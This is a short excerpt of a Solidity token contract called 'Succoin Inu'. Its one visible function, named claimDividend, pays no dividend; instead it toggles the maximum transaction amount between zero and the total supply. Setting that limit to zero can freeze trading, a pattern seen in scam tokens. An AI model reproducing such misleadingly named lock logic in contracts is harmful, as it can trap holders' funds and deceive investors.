...
contract SuccoinInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Succoin Inu";
    string private _symbol = "Succoin Inu";
    ...
    function claimDividend() private {
        _maxTxAmount = _totalSupply == _maxTxAmount ? 0 : _totalSupply;
    }
